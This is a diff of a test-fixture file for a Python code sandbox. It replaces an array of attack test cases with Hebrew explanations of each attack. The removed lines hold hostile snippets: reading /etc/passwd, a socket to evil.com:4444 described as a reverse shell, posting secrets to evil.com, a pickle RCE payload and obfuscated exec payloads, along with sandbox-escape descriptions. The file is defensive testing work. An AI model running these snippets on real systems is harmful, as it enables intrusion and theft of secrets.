@@ -1,27 +1,6 @@
-/**
- * Python Security Attack Vectors
- * 
- * Python is commonly used for scripting and has powerful system access capabilities.
- * These tests verify blocking of dangerous operations in Python code.
- * 
- * Each test includes:
- * - name: Test identifier
- * - code: The malicious code attempt
- * - expectBlocked: Whether this should be blocked (true) or allowed (false)
- * - category: Attack category for grouping
- * - explanation: Human-readable description of how hackers use this attack
- */
-
-export const pythonTests = [
-  // ════════════════════════════════════════════════════════════════
-  // COMMAND EXECUTION ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'Python: os.system',
-    code: `import os; os.system('whoami')`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `
+/** Hebrew explanations keyed by the canonical English fixture name. */
+export const pythonExplanations = Object.freeze({
+  "Python: os.system": `
       🎯 מתקפה: הרצת פקודות Shell ישירה
 
       איך האקרים משתמשים בזה:
@@ -38,13 +17,7 @@ export const pythonTests = [
       זה אחד מווקטורי ה-RCE הנפוצים ביותר ב-Python, ונמצא
       באינספור CVEs ואירועי אבטחה.
     `,
-  },
-  {
-    name: 'Python: os.popen',
-    code: `import os; output = os.popen('ls -la').read()`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `
+  "Python: os.popen": `
       🎯 מתקפה: הרצת פקודה עם לכידת פלט
 
       איך האקרים משתמשים בזה:
@@ -56,13 +29,7 @@ export const pythonTests = [
       - לרשום תיקיות כדי למצוא קבצים בעלי ערך
       - להריץ פקודות ולעבד את הפלט שלהן בתוכנית
     `,
-  },
-  {
-    name: 'Python: os.exec',
-    code: `import os; os.execvp('sh', ['sh', '-c', 'whoami'])`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `
+  "Python: os.exec": `
       🎯 מתקפה: החלפת תהליך באמצעות משפחת exec
 
       איך האקרים משתמשים בזה:
@@ -74,13 +41,7 @@ export const pythonTests = [
       - הרצת קבצים בינאריים ללא שכבת shell
       - קשה יותר למעקב כי התהליך מוחלף לחלוטין
     `,
-  },
-  {
-    name: 'Python: os.spawn',
-    code: `import os; os.spawnl(os.P_WAIT, '/bin/ls', 'ls', '-la')`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `
+  "Python: os.spawn": `
       🎯 מתקפה: יצירת תהליכים חדשים
 
       איך האקרים משתמשים בזה:
@@ -92,13 +53,7 @@ export const pythonTests = [
       - הרצת קבצים בינאריים עם ארגומנטים ספציפיים
       - שליטה במצב ההרצה של התהליך, כמו המתנה או הרצה מיידית
     `,
-  },
-  {
-    name: 'Python: subprocess.run',
-    code: `import subprocess; subprocess.run(['ls', '-la'])`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `
+  "Python: subprocess.run": `
       🎯 מתקפה: הרצת Subprocess מודרנית
 
       איך האקרים משתמשים בזה:
@@ -111,13 +66,7 @@ export const pythonTests = [
       - שרשור פקודות יחד
       - ממשק הרצת הפקודות הגמיש ביותר
     `,
-  },
-  {
-    name: 'Python: subprocess.Popen',
-    code: `from subprocess import Popen, PIPE; p = Popen('id', shell=True, stdout=PIPE)`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `
+  "Python: subprocess.Popen": `
       🎯 מתקפה: שליטה אינטראקטיבית בתהליך
 
       איך האקרים משתמשים בזה:
@@ -132,13 +81,7 @@ export const pythonTests = [
       הערת אבטחה:
       shell=True מסוכן במיוחד כי הוא מאפשר שימוש בתווי shell מיוחדים.
     `,
-  },
-  {
-    name: 'Python: subprocess.call',
-    code: `import subprocess; subprocess.call('whoami', shell=True)`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `
+  "Python: subprocess.call": `
       🎯 מתקפה: קריאת פקודה פשוטה
 
       איך האקרים משתמשים בזה:
@@ -150,13 +93,7 @@ export const pythonTests = [
       - בדיקה אם פקודות הצליחו
       - נפוץ בסקריפטים אוטומטיים של תקיפה
     `,
-  },
-  {
-    name: 'Python: subprocess.check_output',
-    code: `import subprocess; output = subprocess.check_output(['cat', '/etc/passwd'])`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `
+  "Python: subprocess.check_output": `
       🎯 מתקפה: לכידת פלט פקודה
 
       איך האקרים משתמשים בזה:
@@ -168,13 +105,7 @@ export const pythonTests = [
       - טיפול שגיאות מובנה
       - נפוץ בסקריפטים להדלפת נתונים
     `,
-  },
-  {
-    name: 'Python: commands module (legacy)',
-    code: `import commands; commands.getoutput('id')`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `
+  "Python: commands module (legacy)": `
       🎯 מתקפה: הרצת פקודות במודול Legacy
 
       איך האקרים משתמשים בזה:
@@ -186,17 +117,7 @@ export const pythonTests = [
       - חלק מארגז כלים מקיף לתקיפה
       - קוד Legacy עדיין עשוי להשתמש בזה
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // CODE EXECUTION ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'Python: exec function',
-    code: `exec("import os; os.system('whoami')")`,
-    expectBlocked: true,
-    category: 'code_injection',
-    explanation: `
+  "Python: exec function": `
       🎯 מתקפה: הרצת קוד דינמית באמצעות exec()
 
       איך האקרים משתמשים בזה:
@@ -211,13 +132,7 @@ export const pythonTests = [
       דפוס נפוץ:
       exec(base64.decode(obfuscated_payload))
     `,
-  },
-  {
-    name: 'Python: eval function',
-    code: `eval("__import__('os').system('id')")`,
-    expectBlocked: true,
-    category: 'code_injection',
-    explanation: `
+  "Python: eval function": `
       🎯 מתקפה: הערכת ביטוי עם __import__
 
       איך האקרים משתמשים בזה:
@@ -229,13 +144,7 @@ export const pythonTests = [
       - נמצא לעיתים בפגיעויות Template Injection
       - נפוץ ב-SSTI, כלומר Server-Side Template Injection
     `,
-  },
-  {
-    name: 'Python: compile function',
-    code: `code = compile("import os; os.system('id')", '<string>', 'exec'); exec(code)`,
-    expectBlocked: true,
-    category: 'code_injection',
-    explanation: `
+  "Python: compile function": `
       🎯 מתקפה: קומפילציה והרצה של קוד
 
       איך האקרים משתמשים בזה:
@@ -247,13 +156,7 @@ export const pythonTests = [
       - בדיקה או שינוי של אובייקט קוד
       - עקיפת חסימה של exec() באמצעות compile()
     `,
-  },
-  {
-    name: 'Python: __import__ function',
-    code: `__import__('os').system('id')`,
-    expectBlocked: true,
-    category: 'code_injection',
-    explanation: `
+  "Python: __import__ function": `
       🎯 מתקפה: ייבוא מודולים דינמי
 
       איך האקרים משתמשים בזה:
@@ -265,13 +168,7 @@ export const pythonTests = [
       - עקיפת חסימה של פקודות import
       - רכיב בסיסי בבריחות Sandbox ב-Python
     `,
-  },
-  {
-    name: 'Python: importlib',
-    code: `import importlib; os = importlib.import_module('os'); os.system('id')`,
-    expectBlocked: true,
-    category: 'code_injection',
-    explanation: `
+  "Python: importlib": `
       🎯 מתקפה: טעינת מודולים דרך importlib
 
       איך האקרים משתמשים בזה:
@@ -283,17 +180,7 @@ export const pythonTests = [
       - מניפולציה חזקה יותר של מודולים
       - טעינה מחדש של מודולים לצורך התמדה
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // FILE SYSTEM ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'Python: open function',
-    code: `f = open('/etc/passwd', 'r'); print(f.read())`,
-    expectBlocked: true,
-    category: 'file_system',
-    explanation: `
+  "Python: open function": `
       🎯 מתקפה: קריאת קבצים ישירה
 
       איך האקרים משתמשים בזה:
@@ -310,13 +197,7 @@ export const pythonTests = [
       בסביבת הרצת קוד מבודדת, גישה לקבצים צריכה להיות חסומה
       לחלוטין כדי למנוע דליפת מידע.
     `,
-  },
-  {
-    name: 'Python: File write',
-    code: `f = open('/tmp/backdoor.py', 'w'); f.write('malicious code'); f.close()`,
-    expectBlocked: true,
-    category: 'file_system',
-    explanation: `
+  "Python: File write": `
       🎯 מתקפה: כתיבת קבצים זדוניים
 
       איך האקרים משתמשים בזה:
@@ -329,13 +210,7 @@ export const pythonTests = [
       - כתיבת cron jobs למתקפות מתוזמנות
       - שתילת מפתחות SSH לגישה עתידית
     `,
-  },
-  {
-    name: 'Python: os.path operations',
-    code: `import os.path; print(os.path.exists('/etc/shadow'))`,
-    expectBlocked: true,
-    category: 'file_system',
-    explanation: `
+  "Python: os.path operations": `
       🎯 מתקפה: סיור במערכת הקבצים
 
       איך האקרים משתמשים בזה:
@@ -348,13 +223,7 @@ export const pythonTests = [
       - מציאת מיקומים ניתנים לכתיבה
       - זיהוי מטרות בעלות ערך
     `,
-  },
-  {
-    name: 'Python: os.listdir',
-    code: `import os; print(os.listdir('/'))`,
-    expectBlocked: true,
-    category: 'file_system',
-    explanation: `
+  "Python: os.listdir": `
       🎯 מתקפה: רשימת תיקיות
 
       איך האקרים משתמשים בזה:
@@ -367,13 +236,7 @@ export const pythonTests = [
       - גילוי מבנה האפליקציה
       - איתור קבצי גיבוי עם סיסמאות
     `,
-  },
-  {
-    name: 'Python: pathlib',
-    code: `from pathlib import Path; print(Path('/etc/passwd').read_text())`,
-    expectBlocked: true,
-    category: 'file_system',
-    explanation: `
+  "Python: pathlib": `
       🎯 מתקפה: גישה לקבצים דרך pathlib מודרני
 
       איך האקרים משתמשים בזה:
@@ -385,13 +248,7 @@ export const pythonTests = [
       - עשוי לעקוף פילטרים שבודקים רק את open
       - תחביר נקי יותר לפעולות קבצים
     `,
-  },
-  {
-    name: 'Python: shutil operations',
-    code: `import shutil; shutil.copy('/etc/passwd', '/tmp/stolen.txt')`,
-    expectBlocked: true,
-    category: 'file_system',
-    explanation: `
+  "Python: shutil operations": `
       🎯 מתקפה: העתקה והעברה של קבצים
 
       איך האקרים משתמשים בזה:
@@ -403,13 +260,7 @@ export const pythonTests = [
       - העברת קבצים כדי לשבש אפליקציות
       - העתקת תיקיות רקורסיבית לגניבה המונית
     `,
-  },
-  {
-    name: 'Python: fileinput',
-    code: `import fileinput; [print(l) for l in fileinput.input('/etc/passwd')]`,
-    expectBlocked: true,
-    category: 'file_system',
-    explanation: `
+  "Python: fileinput": `
       🎯 מתקפה: איטרציה על קלט מקבצים
 
       איך האקרים משתמשים בזה:
@@ -421,13 +272,7 @@ export const pythonTests = [
       - עיבוד כמה קבצים בבת אחת
       - שינוי קבצים במקום
     `,
-  },
-  {
-    name: 'Python: io module',
-    code: `import io; f = io.open('/etc/passwd'); print(f.read())`,
-    expectBlocked: true,
-    category: 'file_system',
-    explanation: `
+  "Python: io module": `
       🎯 מתקפה: גישה לקבצים דרך מודול io
 
       איך האקרים משתמשים בזה:
@@ -439,17 +284,7 @@ export const pythonTests = [
       - תמיכה במצב בינארי וטקסטואלי
       - שליטה בבאפרים לקבצים גדולים
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // NETWORK ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'Python: socket connection',
-    code: `import socket; s = socket.socket(); s.connect(('evil.com', 4444))`,
-    expectBlocked: true,
-    category: 'network',
-    explanation: `
+  "Python: socket connection": `
       🎯 מתקפה: חיבור Socket גולמי Reverse Shell
 
       איך האקרים משתמשים בזה:
@@ -464,13 +299,7 @@ export const pythonTests = [
       דפוס קלאסי:
       socket.connect(attacker) → os.dup2(socket, stdin/stdout) → exec('/bin/sh')
     `,
-  },
-  {
-    name: 'Python: urllib request',
-    code: `from urllib.request import urlopen; print(urlopen('https://evil.com').read())`,
-    expectBlocked: true,
-    category: 'network',
-    explanation: `
+  "Python: urllib request": `
       🎯 מתקפה: הדלפת נתונים דרך HTTP
 
       איך האקרים משתמשים בזה:
@@ -483,13 +312,7 @@ export const pythonTests = [
       - beacon לשרתי C2
       - מתקפות SSRF, כלומר Server-Side Request Forgery
     `,
-  },
-  {
-    name: 'Python: http.client',
-    code: `import http.client; conn = http.client.HTTPConnection('evil.com')`,
-    expectBlocked: true,
-    category: 'network',
-    explanation: `
+  "Python: http.client": `
       🎯 מתקפה: לקוח HTTP ברמה נמוכה
 
       איך האקרים משתמשים בזה:
@@ -501,13 +324,7 @@ export const pythonTests = [
       - הדלפת נתונים בכותרות HTTP
       - מתקפות HTTP smuggling
     `,
-  },
-  {
-    name: 'Python: ftplib',
-    code: `from ftplib import FTP; ftp = FTP('evil.com')`,
-    expectBlocked: true,
-    category: 'network',
-    explanation: `
+  "Python: ftplib": `
       🎯 מתקפה: העברת קבצים דרך FTP
 
       איך האקרים משתמשים בזה:
@@ -519,13 +336,7 @@ export const pythonTests = [
       - הורדת כלים נוספים
       - פרוטוקול מסורתי שעשוי לעקוף פילטרי Web
     `,
-  },
-  {
-    name: 'Python: smtplib',
-    code: `import smtplib; s = smtplib.SMTP('mail.evil.com')`,
-    expectBlocked: true,
-    category: 'network',
-    explanation: `
+  "Python: smtplib": `
       🎯 מתקפה: הדלפה דרך אימייל
 
       איך האקרים משתמשים בזה:
@@ -537,13 +348,7 @@ export const pythonTests = [
       - שימוש בשרת כ-spam relay
       - ערוץ סמוי להדלפת נתונים
     `,
-  },
-  {
-    name: 'Python: requests library',
-    code: `import requests; requests.post('https://evil.com/collect', json={'secrets': 'data'})`,
-    expectBlocked: true,
-    category: 'network',
-    explanation: `
+  "Python: requests library": `
       🎯 מתקפה: ספריית בקשות HTTP
 
       איך האקרים משתמשים בזה:
@@ -555,17 +360,7 @@ export const pythonTests = [
       - אינטראקציה קלה עם APIs
       - טיפול ב-cookies וב-sessions לבקשות מאומתות
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // SYSTEM ACCESS ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'Python: os.environ',
-    code: `import os; print(os.environ)`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `
+  "Python: os.environ": `
       🎯 מתקפה: גניבת משתני סביבה
 
       איך האקרים משתמשים בזה:
@@ -578,13 +373,7 @@ export const pythonTests = [
       - מציאת JWT secrets
       - גישה להרשאות ענן
     `,
-  },
-  {
-    name: 'Python: os.getcwd',
-    code: `import os; print(os.getcwd())`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `
+  "Python: os.getcwd": `
       🎯 מתקפה: חשיפת נתיב עבודה
 
       איך האקרים משתמשים בזה:
@@ -596,13 +385,7 @@ export const pythonTests = [
       - סיוע במתקפות Path Traversal
       - איסוף מידע
     `,
-  },
-  {
-    name: 'Python: platform info',
-    code: `import platform; print(platform.system(), platform.release())`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `
+  "Python: platform info": `
       🎯 מתקפה: זיהוי מערכת
 
       איך האקרים משתמשים בזה:
@@ -614,13 +397,7 @@ export const pythonTests = [
       - מציאת גרסת kernel עבור exploits
       - זיהוי ארכיטקטורת המערכת
     `,
-  },
-  {
-    name: 'Python: sys.exit',
-    code: `import sys; sys.exit(1)`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `
+  "Python: sys.exit": `
       🎯 מתקפה: מניעת שירות
 
       איך האקרים משתמשים בזה:
@@ -631,13 +408,7 @@ export const pythonTests = [
       - שיבוש שירות למשתמשים
       - טשטוש עקבות באמצעות סיום לפני כתיבת לוגים
     `,
-  },
-  {
-    name: 'Python: getpass module',
-    code: `import getpass; print(getpass.getuser())`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `
+  "Python: getpass module": `
       🎯 מתקפה: איסוף מידע על המשתמש
 
       איך האקרים משתמשים בזה:
@@ -649,13 +420,7 @@ export const pythonTests = [
       - מיקוד בתיקיות משתמש ספציפיות
       - סיוע בהעלאת הרשאות
     `,
-  },
-  {
-    name: 'Python: ctypes',
-    code: `import ctypes; ctypes.CDLL('libc.so.6')`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `
+  "Python: ctypes": `
       🎯 מתקפה: טעינת קוד Native
 
       איך האקרים משתמשים בזה:
@@ -668,13 +433,7 @@ export const pythonTests = [
       - עקיפה מלאה של sandboxing ב-Python
       - מניפולציה בזיכרון
     `,
-  },
-  {
-    name: 'Python: multiprocessing',
-    code: `from multiprocessing import Process; Process(target=lambda: __import__('os').system('id')).start()`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `
+  "Python: multiprocessing": `
       🎯 מתקפה: יצירת תהליכים להתמדה
 
       איך האקרים משתמשים בזה:
@@ -686,13 +445,7 @@ export const pythonTests = [
       - fork bomb למניעת שירות
       - מתקפות מקביליות
     `,
-  },
-  {
-    name: 'Python: threading',
-    code: `import threading; threading.Thread(target=lambda: __import__('os').system('id')).start()`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `
+  "Python: threading": `
       🎯 מתקפה: הרצת קוד ברקע דרך Threads
 
       איך האקרים משתמשים בזה:
@@ -704,17 +457,7 @@ export const pythonTests = [
       - התחמקות מניטור חד-תהליכי
       - עיבוד נתונים מקבילי
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // PICKLE/SERIALIZATION ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'Python: pickle deserialization',
-    code: `import pickle; pickle.loads(b"cos\\nsystem\\n(S'id'\\ntR.")`,
-    expectBlocked: true,
-    category: 'deserialization',
-    explanation: `
+  "Python: pickle deserialization": `
       🎯 מתקפה: RCE דרך Deserialization של Pickle
 
       איך האקרים משתמשים בזה:
@@ -729,13 +472,7 @@ export const pythonTests = [
       אזהרה:
       לעולם אל תעשה unpickle לנתונים ממקור לא מהימן!
     `,
-  },
-  {
-    name: 'Python: marshal',
-    code: `import marshal; marshal.loads(b'data')`,
-    expectBlocked: true,
-    category: 'deserialization',
-    explanation: `
+  "Python: marshal": `
       🎯 מתקפה: טעינת אובייקטי קוד דרך marshal
 
       איך האקרים משתמשים בזה:
@@ -747,13 +484,7 @@ export const pythonTests = [
       - עקיפת ניתוח קוד מקור
       - הרצת payloads מעורפלים
     `,
-  },
-  {
-    name: 'Python: shelve',
-    code: `import shelve; db = shelve.open('/tmp/evil')`,
-    expectBlocked: true,
-    category: 'deserialization',
-    explanation: `
+  "Python: shelve": `
       🎯 מתקפה: אובייקטים מתמידים דרך shelve
 
       איך האקרים משתמשים בזה:
@@ -765,17 +496,7 @@ export const pythonTests = [
       - אותם סיכוני RCE כמו pickle
       - התמדה של תקיפה דרך קבצים
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // ENCODING BYPASS ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'Python: base64 decode bypass',
-    code: `import base64; exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='))`,
-    expectBlocked: true,
-    category: 'encoding_bypass',
-    explanation: `
+  "Python: base64 decode bypass": `
       🎯 מתקפה: Payload מקודד Base64
 
       איך האקרים משתמשים בזה:
@@ -787,13 +508,7 @@ export const pythonTests = [
       - הסתרת payload במחרוזות שנראות אקראיות
       - טכניקת ערפול סטנדרטית בנוזקות
     `,
-  },
-  {
-    name: 'Python: chr() bypass',
-    code: `exec(''.join([chr(105),chr(109),chr(112),chr(111),chr(114),chr(116)]))`,
-    expectBlocked: true,
-    category: 'encoding_bypass',
-    explanation: `
+  "Python: chr() bypass": `
       🎯 מתקפה: ערפול באמצעות קודי תווים
 
       איך האקרים משתמשים בזה:
@@ -805,13 +520,7 @@ export const pythonTests = [
       - כל תו מיוצג כמספר
       - נפוץ באתגרי CTF וב-exploits
     `,
-  },
-  {
-    name: 'Python: hex decode bypass',
-    code: `exec(bytes.fromhex('696d706f7274206f73').decode())`,
-    expectBlocked: true,
-    category: 'encoding_bypass',
-    explanation: `
+  "Python: hex decode bypass": `
       🎯 מתקפה: Payload מקודד Hex
 
       איך האקרים משתמשים בזה:
@@ -823,13 +532,7 @@ export const pythonTests = [
       - עקיפת פילטרים שמזהים רק Base64
       - פחות חשוד ממחרוזות Base64
     `,
-  },
-  {
-    name: 'Python: codecs bypass',
-    code: `import codecs; exec(codecs.decode('vzcbeg bf', 'rot_13'))`,
-    expectBlocked: true,
-    category: 'encoding_bypass',
-    explanation: `
+  "Python: codecs bypass": `
       🎯 מתקפה: ערפול ROT13 / Codec
 
       איך האקרים משתמשים בזה:
@@ -841,13 +544,7 @@ export const pythonTests = [
       - rot_13 הוא החלפת אותיות פשוטה
       - ניתן לשרשר כמה קידודים יחד
     `,
-  },
-  {
-    name: 'Python: zlib decompress bypass',
-    code: `import zlib; exec(zlib.decompress(b'x\\x9c+\\xca\\xcc+\\xd1H\\xcf\\xc9OH\\xcc)f\\x00\\x00\\x1e\\x06\\x04\\xa3'))`,
-    expectBlocked: true,
-    category: 'encoding_bypass',
-    explanation: `
+  "Python: zlib decompress bypass": `
       🎯 מתקפה: Payload דחוס
 
       איך האקרים משתמשים בזה:
@@ -859,17 +556,7 @@ export const pythonTests = [
       - קשה יותר לזהות תבניות
       - נתונים בינאריים נראים כמו רעש אקראי
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // INTROSPECTION/REFLECTION ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'Python: globals() access',
-    code: `print(globals())`,
-    expectBlocked: true,
-    category: 'introspection',
-    explanation: `
+  "Python: globals() access": `
       🎯 מתקפה: גישה ל-Global Namespace
 
       איך האקרים משתמשים בזה:
@@ -881,13 +568,7 @@ export const pythonTests = [
       - גישה ל-__builtins__ עבור פונקציות מסוכנות
       - מציאת סודות של האפליקציה ב-globals
     `,
-  },
-  {
-    name: 'Python: locals() access',
-    code: `print(locals())`,
-    expectBlocked: true,
-    category: 'introspection',
-    explanation: `
+  "Python: locals() access": `
       🎯 מתקפה: גישה ל-Local Namespace
 
       איך האקרים משתמשים בזה:
@@ -899,13 +580,7 @@ export const pythonTests = [
       - גילוי מודולים שיובאו מקומית
       - דליפת מידע
     `,
-  },
-  {
-    name: 'Python: vars() access',
-    code: `print(vars())`,
-    expectBlocked: true,
-    category: 'introspection',
-    explanation: `
+  "Python: vars() access": `
       🎯 מתקפה: גישה למילון משתנים
 
       איך האקרים משתמשים בזה:
@@ -917,13 +592,7 @@ export const pythonTests = [
       - שינוי תכונות פרטיות
       - דומה ל-globals()/locals()
     `,
-  },
-  {
-    name: 'Python: dir() enumeration',
-    code: `print(dir(__builtins__))`,
-    expectBlocked: true,
-    category: 'introspection',
-    explanation: `
+  "Python: dir() enumeration": `
       🎯 מתקפה: מיפוי Attributes
 
       איך האקרים משתמשים בזה:
@@ -935,13 +604,7 @@ export const pythonTests = [
       - מציאת יכולות לא מתועדות
       - מיפוי ממשקי אובייקטים
     `,
-  },
-  {
-    name: 'Python: getattr dynamic access',
-    code: `getattr(__builtins__, '__import__')('os').system('id')`,
-    expectBlocked: true,
-    category: 'introspection',
-    explanation: `
+  "Python: getattr dynamic access": `
       🎯 מתקפה: גישה דינמית ל-Attributes
 
       איך האקרים משתמשים בזה:
@@ -953,13 +616,7 @@ export const pythonTests = [
       - עקיפת חסימה של גישה ישירה
       - טכניקת בסיס בבריחות Sandbox
     `,
-  },
-  {
-    name: 'Python: __subclasses__ traversal',
-    code: `print(().__class__.__bases__[0].__subclasses__())`,
-    expectBlocked: true,
-    category: 'introspection',
-    explanation: `
+  "Python: __subclasses__ traversal": `
       🎯 מתקפה: מעבר בהיררכיית המחלקות
 
       איך האקרים משתמשים בזה:
@@ -974,13 +631,7 @@ export const pythonTests = [
       דפוס נפוץ:
       tuple.__mro__[1].__subclasses__() → find os._wrap_close → access os
     `,
-  },
-  {
-    name: 'Python: __mro__ traversal',
-    code: `print(().__class__.__mro__)`,
-    expectBlocked: true,
-    category: 'introspection',
-    explanation: `
+  "Python: __mro__ traversal": `
       🎯 מתקפה: מעבר ב-Method Resolution Order
 
       איך האקרים משתמשים בזה:
@@ -992,13 +643,7 @@ export const pythonTests = [
       - מציאת כל המחלקות במערכת
       - שער גישה למחלקות מסוכנות
     `,
-  },
-  {
-    name: 'Python: __builtins__ access',
-    code: `print(__builtins__)`,
-    expectBlocked: true,
-    category: 'introspection',
-    explanation: `
+  "Python: __builtins__ access": `
       🎯 מתקפה: גישה למודול Builtins
 
       איך האקרים משתמשים בזה:
@@ -1010,17 +655,7 @@ export const pythonTests = [
       - גם כאשר שמות ישירים נחסמים
       - __builtins__.__import__ הוא bypass נפוץ
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // AST/CODE OBJECT ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'Python: ast module',
-    code: `import ast; tree = ast.parse('import os; os.system("id")')`,
-    expectBlocked: true,
-    category: 'code_manipulation',
-    explanation: `
+  "Python: ast module": `
       🎯 מתקפה: מניפולציה ב-AST
 
       איך האקרים משתמשים בזה:
@@ -1032,13 +667,7 @@ export const pythonTests = [
       - שינוי קוד לגיטימי בזמן ריצה
       - יצירת payloads מעורפלים
     `,
-  },
-  {
-    name: 'Python: dis module',
-    code: `import dis; dis.dis(lambda: __import__('os'))`,
-    expectBlocked: true,
-    category: 'code_manipulation',
-    explanation: `
+  "Python: dis module": `
       🎯 מתקפה: פירוק Bytecode
 
       איך האקרים משתמשים בזה:
@@ -1050,13 +679,7 @@ export const pythonTests = [
       - הבנת bytecode לצורך מניפולציה
       - לימודי ליצירת exploits
     `,
-  },
-  {
-    name: 'Python: types.CodeType',
-    code: `import types; code = types.CodeType(0,0,0,0,0,0,b'',(),(),(),'','',0,b'')`,
-    expectBlocked: true,
-    category: 'code_manipulation',
-    explanation: `
+  "Python: types.CodeType": `
       🎯 מתקפה: יצירת אובייקטי קוד
 
       איך האקרים משתמשים בזה:
@@ -1068,17 +691,7 @@ export const pythonTests = [
       - עקיפת ניתוח קוד מקור
       - הזרקת bytecode ישירות
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // SIGNAL/INTERRUPT ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'Python: signal handling',
-    code: `import signal; signal.signal(signal.SIGTERM, lambda s,f: __import__('os').system('id'))`,
-    expectBlocked: true,
-    category: 'signal_handling',
-    explanation: `
+  "Python: signal handling": `
       🎯 מתקפה: הרצת קוד דרך Signal Handler
 
       איך האקרים משתמשים בזה:
@@ -1090,13 +703,7 @@ export const pythonTests = [
       - התמדה דרך טיפול ב-signals
       - הפעלה בעקבות אירועים חיצוניים
     `,
-  },
-  {
-    name: 'Python: atexit',
-    code: `import atexit; atexit.register(lambda: __import__('os').system('id'))`,
-    expectBlocked: true,
-    category: 'signal_handling',
-    explanation: `
+  "Python: atexit": `
       🎯 מתקפה: רישום Exit Handler
 
       איך האקרים משתמשים בזה:
@@ -1108,83 +715,92 @@ export const pythonTests = [
       - הרצה מובטחת גם בעת שגיאות
       - התמדה שמסתווה כ-cleanup
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // SAFE CODE
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'Python: Safe print',
-    code: `print('Hello, World!')`,
-    expectBlocked: false,
-    expectedOutput: 'Hello, World!',
-    category: 'safe_code',
-    explanation: `
+  "Python: Safe print": `
       ✅ בטוח: פלט בסיסי
 
       זהו קוד לגיטימי שצריך לרוץ:
       print() היא פעולה בסיסית ללימוד Python
       ולדיבוג קוד. בטוחה לחלוטין.
     `,
-  },
-  {
-    name: 'Python: Safe math',
-    code: `print(2 + 2)`,
-    expectBlocked: false,
-    expectedOutput: '4',
-    category: 'safe_code',
-    explanation: `
+  "Python: Safe math": `
       ✅ בטוח: פעולות מתמטיות
 
       זהו קוד לגיטימי שצריך לרוץ:
       חשבון בסיסי הוא חלק חיוני מכל תכנות.
     `,
-  },
-  {
-    name: 'Python: Safe list comprehension',
-    code: `print([x**2 for x in range(5)])`,
-    expectBlocked: false,
-    expectedOutput: '[0, 1, 4, 9, 16]',
-    category: 'safe_code',
-    explanation: `
+  "Python: Safe list comprehension": `
       ✅ בטוח: List Comprehension
 
       זהו קוד לגיטימי שצריך לרוץ:
       List comprehensions הם סגנון Pythonic ונפוץ
       בלימוד קורסים בסיסיים.
     `,
-  },
-  {
-    name: 'Python: Safe class definition',
-    code: `class Point:
-    def __init__(self, x, y):
-        self.x = x
-        self.y = y
-p = Point(3, 4)
-print(p.x + p.y)`,
-    expectBlocked: false,
-    expectedOutput: '7',
-    category: 'safe_code',
-    explanation: `
+  "Python: Safe class definition": `
       ✅ בטוח: תכנות מונחה-עצמים
 
       זהו קוד לגיטימי שצריך לרוץ:
       הגדרת מחלקות ויצירת אובייקטים הן
       פעולות בסיסיות בפיתוח Python.
     `,
-  },
-  {
-    name: 'Python: Safe lambda',
-    code: `double = lambda x: x * 2; print(double(5))`,
-    expectBlocked: false,
-    expectedOutput: '10',
-    category: 'safe_code',
-    explanation: `
+  "Python: Safe lambda": `
       ✅ בטוח: פונקציות Lambda
 
       זהו קוד לגיטימי שצריך לרוץ:
       ביטויי Lambda שימושיים לפונקציות אנונימיות
       פשוטות.
     `,
-  },
-];
+  "Python: sys.modules": `
+      🎯 מתקפה: גישה למנגנון הייבוא
+
+      sys.modules מחזיק כל מודול שנטען, כולל המודולים שארגז החול
+      הגן עליהם. קריאה ממנו מאפשרת לתוכנית למצוא הפניה לא מוגנת
+      לפונקציה שהמערכת החליפה בגרסה בטוחה.
+
+      למה זה חסום:
+      המודול sys מותר רק עם המאפיינים שתלמידים באמת צריכים. המאפיין
+      הזה אינו אחד מהם. חסימת המאפיין במקום המודול כולו מאפשרת
+      ל־sys.exit() לעבוד, בלי לאפשר את המתקפה הזאת.
+    `,
+  "Python: sys._getframe": `
+      🎯 מתקפה: מעבר דרך מחסנית הקריאות
+
+      הפונקציה _getframe מחזירה מסגרת ריצה. ממנה אפשר להגיע אל
+      f_globals ואל f_builtins, ומשם אל open() המקורית והלא מוגנת
+      שהגנת מערכת הקבצים החליפה.
+
+      למה זה חסום:
+      זו בדיוק המתקפה שהגנת הנתיבים אינה יכולה לעצור לבדה, ולכן גם
